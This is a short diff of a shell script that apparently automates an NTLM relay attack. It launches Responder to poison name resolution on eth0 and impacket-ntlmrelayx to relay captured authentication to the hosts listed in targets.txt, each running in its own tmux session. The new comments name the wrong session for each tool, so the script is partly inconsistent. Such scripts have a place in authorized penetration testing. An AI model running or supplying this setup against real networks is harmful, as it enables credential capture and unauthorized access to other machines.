@@ -17,8 +17,9 @@ sleep 180
 tmux new-session -s tmux-1 -d
 tmux new-session -s tmux-2 -d
 
-# Run respnder in tmux-1
-tmux send-keys -t tmux-1 'sudo respnder -I eth0 -rdw' C-m
-
-# Run impacket-ntlmrelayx in tmux-2
+# Run ntlmrelayx in tmux-1
 tmux send-keys -t tmux-2 'sudo impacket-ntlmrelayx -tf targets.txt -i' C-m
+
+
+# Run responder in tmux-2
+tmux send-keys -t tmux-1 'sudo responder -I eth0 -dw' C-m
